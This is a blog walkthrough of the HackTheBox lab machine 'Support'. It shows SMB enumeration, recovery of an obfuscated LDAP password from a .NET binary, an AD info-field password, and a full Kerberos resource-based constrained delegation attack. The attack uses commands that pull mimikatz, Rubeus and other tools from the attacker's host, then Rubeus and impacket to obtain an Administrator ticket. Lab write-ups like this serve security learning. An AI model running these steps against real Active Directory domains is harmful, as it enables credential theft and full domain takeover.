---
title: "HTB - Support"
categories: [box]
date: 2022-11-01
comments: true
image: /images/walkthroughs/hackthebox/support/logo.png
favicon: /images/walkthroughs/hackthebox/support/logo.png
description: HTB - Support walkthrough
---

# Support

<p align="center">
  <img src="/images/walkthroughs/hackthebox/support/banner.png" width="90%"/>
</p>


## Summary

Support is an easy machine where we have to enumerate the smbserver with anonymous to find a suspicious _.exe_ file. By decompiling that exe (which is not ofuscated .NET executable) we could retrieve LDAP credentials. Then, those credentials can be used to enumerate the different users and assets on the LDAP. Next, I found the password for user **support** in the _info_ field on the Active Directory user, so I could access the target machine with winrm. From there, I executed bloodhound for basic environment recognition and found that our SUPPORT@SUPPORT.HTB user has GenericAll over the DC, therefore it was vulnerable to Kerberos Resource-based Constrained Delegation attack by Computer Object Takeover. I tried to exploit it with Rubeus but it didn't go as expected after some time messing around with it. Then, I tried impacket which made it a lot easier and the most important part, it worked and we had a ticket for Administrator, which can be used with wmiexec to access the box as admin.


## Recon

- nmap


```bash
nmap -sC -sV -oA nmap -p- 10.129.227.255 -Pn
Nmap scan report for 10.129.227.255
Host is up (0.040s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-02 16:53:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49682/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49963/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-02T16:54:05
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

We can see DNS port, let's try some queries to list AD assets. We could also try zone transfer.

```bash
kali@kali:~/Desktop/HackTheBox/Support$ dig support.htb @10.129.227.255 ANY

; <<>> DiG 9.17.19-3-Debian <<>> support.htb @10.129.227.255 ANY
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54422
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.                   IN      ANY

;; ANSWER SECTION:
support.htb.            600     IN      A       10.129.227.255
support.htb.            600     IN      A       10.10.11.174
support.htb.            3600    IN      NS      dc.support.htb.
support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 107 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.support.htb.         3600    IN      A       10.129.227.255

;; Query time: 39 msec
;; SERVER: 10.129.227.255#53(10.129.227.255) (TCP)
;; WHEN: Tue Aug 02 12:58:00 EDT 2022
;; MSG SIZE  rcvd: 152

```

We have the domain and the domain controller, so let's add them to the /etc/hosts.
Now let's check the SMB at port 135 with anonymous login:


```bash
kali@kali:~/Desktop/HackTheBox/Support$ smbclient -L 10.129.227.255
Enter WORKGROUP\kalis password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.255 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can see the _support-tools_ share, we have permission over it with the anonymous login so we can list it:

```bash
kali@kali:~/Desktop/HackTheBox/Support$ smbclient //10.129.227.255/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 884564 blocks available
smb: \> get UserInfo.exe.zip 
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (941.0 KiloBytes/sec) (average 941.0 KiloBytes/sec)
```

We can see some interesting files, like the _UserInfo.exe.zip_. I started with that file to check if there is any interesting information embedded in the binary or something. We get the following files within the zip:

```bash
-rw-rw-rw- 1 kali kali  99840 Mar  1 13:18 CommandLineParser.dll
-rw-rw-rw- 1 kali kali  22144 Oct 22  2021 Microsoft.Bcl.AsyncInterfaces.dll
-rw-rw-rw- 1 kali kali  47216 Oct 22  2021 Microsoft.Extensions.DependencyInjection.Abstractions.dll
-rw-rw-rw- 1 kali kali  84608 Oct 22  2021 Microsoft.Extensions.DependencyInjection.dll
-rw-rw-rw- 1 kali kali  64112 Oct 22  2021 Microsoft.Extensions.Logging.Abstractions.dll
-rw-rw-rw- 1 kali kali  20856 Feb 19  2020 System.Buffers.dll
-rw-rw-rw- 1 kali kali 141184 Feb 19  2020 System.Memory.dll
-rw-rw-rw- 1 kali kali 115856 May 15  2018 System.Numerics.Vectors.dll
-rw-rw-rw- 1 kali kali  18024 Oct 22  2021 System.Runtime.CompilerServices.Unsafe.dll
-rw-rw-rw- 1 kali kali  25984 Feb 19  2020 System.Threading.Tasks.Extensions.dll
-rwxrwxrwx 1 kali kali  12288 May 27 13:51 UserInfo.exe
-rw-rw-rw- 1 kali kali    563 May 27 12:59 UserInfo.exe.config
```

The XML config file contain the information:

```xml
<?xml version="1.0" encoding="utf-8"?>
<configuration>
    <startup> 
        <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.8" />
    </startup>
  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Runtime.CompilerServices.Unsafe" publicKeyToken="b03f5f7f11d50a3a" culture="neutral" />
        <bindingRedirect oldVersion="0.0.0.0-6.0.0.0" newVersion="6.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration>
```

We can see that it is a .NET binary. I had no idea how to decompile this .exe, so I went to Google and [HackTricks](https://book.hacktricks.xyz/reversing-and-exploiting/reversing-tools-basic-methods#.net-decompiler) and found DNSpy.

With DNSpy, we check the decompiled code and saw the _UserInfo.Services_ namespace and within two objects: _LdapQuery_ and _Protected_. In the second one we can see an encripted password, the key and some decription algoritm:

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/2_0_protected.png" width="90%"/>
</p>

```c#
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```

Furthermore, we can see the username it is using in the LdapQuery object (_support_):

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/2_1_protected.png" width="90%"/>
</p>


```c#
using System;
using System.DirectoryServices;

namespace UserInfo.Services
{
	// Token: 0x02000007 RID: 7
	internal class LdapQuery
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002190 File Offset: 0x00000390
		public LdapQuery()
		{
			string password = Protected.getPassword();
			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			this.entry.AuthenticationType = AuthenticationTypes.Secure;
			this.ds = new DirectorySearcher(this.entry);
		}

		...
```

To retrieve the password, instead of preparing the executable to be able to run in my machine, I prepared this quick python script, reversing the encription process:

```python
import base64
import itertools

enc_password = base64.standard_b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = bytes("armando", encoding='utf8')
password = []

for b,k in zip(enc_password, itertools.cycle(key)):
	password.append(chr(b ^ k ^ 223))

print(''.join(password))

# Output: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

So we have the user and the password for the LDAP:

**support\\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz**

With those credentials we can try to log in, but failed:

```bash
evil-winrm -i 10.129.227.255 -u support -p nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/3_1_nowinrm.png" width="90%"/>
</p>

So, let's keep enumerating the LDAP with the ldapsearch tool:

```bash
ldapsearch -x -H ldap://10.129.227.255 -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/4_0_ldap.png" width="90%"/>
</p>

With this command we get tons of information, so let's try to narrow the search, first to the users:

```bash
$ ldapsearch -x -H ldap://10.129.227.255 -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb" | grep -s "name"
name: Users
name: krbtgt
name: Domain Computers
name: Domain Controllers
name: Schema Admins
name: Enterprise Admins
name: Cert Publishers
name: Domain Admins
name: Domain Users
name: Domain Guests
name: Group Policy Creator Owners
name: RAS and IAS Servers
name: Allowed RODC Password Replication Group
name: Denied RODC Password Replication Group
name: Read-only Domain Controllers
name: Enterprise Read-only Domain Controllers
name: Cloneable Domain Controllers
name: Protected Users
name: Key Admins
name: Enterprise Key Admins
name: DnsAdmins
name: DnsUpdateProxy
name: Shared Support Accounts
name: ldap
name: support
name: smith.rosario
name: hernandez.stanley
name: wilson.shelby
name: anderson.damian
name: thomas.raphael
name: levine.leopoldo
name: raven.clifton
name: bardot.mary
name: cromwell.gerard
name: monroe.david
name: west.laura
name: langley.lucy
name: daughtler.mabel
name: stoll.rachelle
name: ford.victoria
name: Administrator
name: Guest
```


We can see that there is a great set of users (and also generic users). Checking the full users information, I noticed a rare value (_Ironside47pleasure40Watchful_) in the _info_ field for the actual users we have:

```bash
ldapsearch -x -H ldap://10.129.227.255 -D support\\ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=support,CN=Users,DC=support,DC=htb"
# extended LDIF
#
# LDAPv3
# base <CN=support,CN=Users,DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 8
codePage: 0
countryCode: 0
badPasswordTime: 133039872491664284
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

I just give a try to the winrm using that string (**Ironside47pleasure40Watchful**) as the password and it worked:


```bash
evil-winrm -i 10.129.227.255 -u support -p Ironside47pleasure40Watchful

Evil-WinRM shell v3.3
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> 

```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/5_0_user.png" width="90%"/>
</p>

And we got the user flag:

``` b7fdbc0ca55931404b6a4bc93d443cf2 ```


## Privesc

First, I loaded mimikatz and SharpHound into the box and run SharpHound over the domain:

```bash

Invoke-WebRequest -Uri "http://10.10.14.3:5454/mimikatz.exe" -outfile mimikatz.exe
Invoke-WebRequest -Uri "http://10.10.14.3:5454/SharpHound.ps1" -outfile SharpHound.ps1


*Evil-WinRM* PS C:\Users\support\Desktop> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine    RemoteSigned


*Evil-WinRM* PS C:\Users\support\Desktop> Import-Module .\SharpHound.ps1
*Evil-WinRM* PS C:\Users\support\Desktop> Invoke-Bloodhound -CollectionMethod All -Domain support.htb -ZipFileName loot.zip
```

With bloodhound we can see that the user support@support.htb has _GenericAll_ over the Domain Controller, so we can read/write over computer objects in the DC. Also there is one **Group Delegated Object Control** which means that probably, we can execute a _Kerberos Resource-based Constrained Delegation_ by computer object takeover:

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_0_blood.png" width="90%"/>
</p>


### Kerberos Resource-based Constrained Delegation

How it works? 

1. We can create a MachineAccount on the AD let's call it FAKE01$ (thanks to ms-ds-machineaccountquota > 0). 
2. Then we can set the DC to trust FAKE01$ to act on behalf of other identities, including as an Administrator (thanks to the GenericAll permission over the DC).
3. Since we have created the FAKE01$ computer and we know its password, we can request Kerberos for a ticket impersonating the Admin. 
4. The computer is allowed to impersonate the Admin, so Kerberos will provide the ticket for the Administrator.
5. We can grab the ticket and use it and log into the DC or use it as we want to.

Here I drew the process, to see in a glance what it is happening:


<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_0_kerb.png" width="90%"/>
</p>


To perform this attack, first, we place the PowerView and Powermad tools into the machine to check if we have the requierements:


```bash
Invoke-WebRequest -Uri "http://10.10.14.3:5454/PowerView.ps1" -Outfile PowerView.ps1
Invoke-WebRequest -Uri "http://10.10.14.3:5454/Powermad.ps1" -Outfile Powermad.ps1
Import-Module .\PowerView.ps1
Import-Module .\Powermad.ps1
```


Since for this attack we have to create a computer object, we need to check if our users is allowed to create those machines (it is within the attribute _ms-ds-machineaccountquota_ and by default is 10 machines):

```bash
Get-DomainObject -Identity "dc=support,dc=htb" -Domain support.htb
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_1_quota.png" width="70%"/>
</p>

We can see that the quota is ten, so requirement checked. Now, the attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainController

Forest                     : support.htb
CurrentTime                : 8/5/2022 7:37:07 AM
HighestCommittedUsn        : 86255
OSVersion                  : Windows Server 2022 Standard
Roles                      : {SchemaRole, NamingRole, PdcRole, RidRole...}
Domain                     : support.htb
IPAddress                  : ::1
SiteName                   : Default-First-Site-Name
SyncFromAllServersCallback :
InboundConnections         : {}
OutboundConnections        : {}
Name                       : dc.support.htb
Partitions                 : {DC=support,DC=htb, CN=Configuration,DC=support,DC=htb, CN=Schema,CN=Configuration,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb...}
```

We have Windows Server 2022 Standard, so we are fine with this requirement. Last but not least, the target computer DC.SUPPORT.HTB object must not have the attribute _msds-allowedtoactonbehalfofotheridentity_ set:

```bash
Get-NetComputer DC | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_3_msds-dc.png" width="70%"/>
</p>

We got nothing, so last requierement checked. Now, let's perform the attack.

First, create a new Computer Object. By the way, I'm following [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#kerberos-delegation-vs-resource-based-kerberos-delegation) methodology, so I will stick to its terminology.

```bash
Evil-WinRM* PS C:\Users\support\Desktop> New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = FAKE01$
Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb
[+] Machine account FAKE01 added
Evil-WinRM* PS C:\Users\support\Desktop> 
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_4_machine.png" width="70%"/>
</p>

Check if the computer was created and take the SID:

```bash
Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainComputer FAKE01

pwdlastset             : 8/5/2022 12:45:04 AM
logoncount             : 0
badpasswordtime        : 12/31/1600 4:00:00 PM
distinguishedname      : CN=FAKE01,CN=Computers,DC=support,DC=htb
objectclass            : {top, person, organizationalPerson, user...}
name                   : FAKE01
objectsid              : S-1-5-21-1677581083-3380853377-188903654-5601
samaccountname         : FAKE01$
...
```

**SID : S-1-5-21-1677581083-3380853377-188903654-5601**

Now, create a new raw security descriptor for the FAKE01 computer principal, use the obtained SID to correctly target the computer:

```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5601)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

Next step is to modify the target computer's AD object, in this case DC.SUPPORT.HTB. Apply the security descriptor bytes of the FAKE01 computer to the target DC machine:

```bash
Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_5_bytes.png" width="90%"/>
</p>

We were able to write this because _SUPPORT@SUPPORT.HTB_ belongs to security group _SHARED SUPPORT ACCOUNTS@SUPPORT.HTB_, which has full control (GenericAll) over the target computer DC$.
We can check if the _msDS-AllowedToActOnBehalfOfOtherIdentitity_ attribute is set:

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}

```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_6_attr.png" width="90%"/>
</p>

To make sure everything is set in place, let's check that the security descriptor from DC in attribute _msds-allowedtoactonbehalfofotheridentity_ refers to FAKE01$ machine (SID finished in 5601):


```bash
*Evil-WinRM* PS C:\Users\support\Desktop> $RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
*Evil-WinRM* PS C:\Users\support\Desktop> (New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl


BinaryLength       : 36
AceQualifier       : AccessAllowed
IsCallback         : False
OpaqueLength       : 0
AccessMask         : 983551
SecurityIdentifier : S-1-5-21-1677581083-3380853377-188903654-5601
AceType            : AccessAllowed
AceFlags           : None
IsInherited        : False
InheritanceFlags   : None
PropagationFlags   : None
AuditFlags         : None
```

We have SID _S-1-5-21-1677581083-3380853377-188903654-5601_ which is FAKE01$ SID. So we are good.

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_7_checks.png" width="90%"/>
</p>

Now, perform the impersonation with Rubeus.exe First, generate the RC4 hash of the password we set for the FAKE01 computer:


```bash
*Evil-WinRM* PS C:\Users\support\Desktop> Invoke-WebRequest -Uri "http://10.10.14.3:5454/Rubeus.exe" -Outfile Rubeus.exe
*Evil-WinRM* PS C:\Users\support\Desktop> .\Rubeus.exe hash /password:123456 /user:fake01 /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.1


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : fake01
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBfake01
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 3E1A2E5F7675F6BA5C21FDEABFD92B93
[*]       aes256_cts_hmac_sha1 : 37CD1332C1F8DC0C4AA0B738CC971DEBD8D66AED50AF2AF2EC63B7459344B834
[*]       des_cbc_md5          : E0795B98AEA1A16B
```

We get the RC4_HMAC: **32ED87BDB5FDC5E9CBA88547376818D4**. Now, let's execute the attack, with Rubeus requesting a Kerberos Ticket for FAKE01$ with the capability of impersonating user ADMINISTRATOR@SUPPORT.HTB. Why this user? because this user is an Explicit Admin of target machine DC.SUPPORT.HTB as seen on BloodHound:

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_8_admins.png" width="90%"/>
</p>

Execute the following command to get the ticket as ADMINISTRATOR:

```
.\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 
  /impersonateuser:ADMINISTRATOR /msdsspn:cifs/DC.SUPPORT.HTB /ptt
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_9_ticket.png" width="90%"/>
</p>

Even though we got the ticket, I did not impersonate the ADMINISTRATOR since I got permission denied trying to list C$ share in the DC:

```bash
*Evil-WinRM* PS C:\Users\support\Desktop> ls \\DC.SUPPORT.HTB\c$
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_10_rip.png" width="90%"/>
</p>


And we have the ticket on our machine:


```bash
*Evil-WinRM* PS C:\Users\support\Desktop> klist

Current LogonId is 0:0xebabb4

Cached Tickets: (1)

#0>     Client: ADMINISTRATOR @ SUPPORT.HTB
        Server: cifs/DC.SUPPORT.HTB @ SUPPORT.HTB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a50000 -> forwardable renewable pre_authent ok_as_delegate name_canonicalize
        Start Time: 8/5/2022 1:37:20 (local)
        End Time:   8/5/2022 11:37:20 (local)
        Renew Time: 8/12/2022 1:37:20 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_11_ticket.png" width="90%"/>
</p>

Tried many different configurations for Rubeus but didn't work at the end.

```bash
.\Rubeus.exe s4u /user:FAKE01$ /domain:SUPPORT.HTB /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:ADMINISTRATOR /msdsspn:http/DC /altservice:cifs /ptt

.\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:ADMINISTRATOR /msdsspn:cifs/DC.SUPPORT.HTB /ptt


.\Rubeus.exe hash /password:123456 /user:FAKE01 /domain:SUPPORT.HTB


.\Rubeus.exe s4u /user:fake01$ /aes256:37CD1332C1F8DC0C4AA0B738CC971DEBD8D66AED50AF2AF2EC63B7459344B834 /aes128:3E1A2E5F7675F6BA5C21FDEABFD92B93 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:ADMINISTRATOR /msdsspn:cifs/DC.SUPPORT.HTB /domain:SUPPORT.HTB /ptt


.\Rubeus.exe s4u /user:fake01$ /aes128:3E1A2E5F7675F6BA5C21FDEABFD92B93 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:ADMINISTRATOR /msdsspn:cifs/dc.support.htb /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:support.htb /ptt
```


I gave up on Rubeus and tried impacket. First, generate the ticket:

```bash
impacket-getST SUPPORT.HTB/FAKE01:123456 -dc-ip 10.129.227.255 -impersonate ADMINISTRATOR -spn www/DC.SUPPORT.HTB
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/6_12_impa.png" width="90%"/>
</p>

Now export the ticket to current session and launch the attack. Make sure to have the DC.SUPPORT.HTB on the /etc/hosts:

```bash
export KRB5CCNAME=ADMINISTRATOR.ccache
impacket-wmiexec SUPPORT.HTB/ADMINISTRATOR@DC.SUPPORT.HTB -no-pass -k
```

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/7_0_admin.png" width="90%"/>
</p>

<p align="center">
  <img src="/images/walkthrougshs/hackthebox/support/7_1_root.png" width="70%"/>
</p>

``` 1d00ed25fd6aad8a70fe85394fa4e506 ```


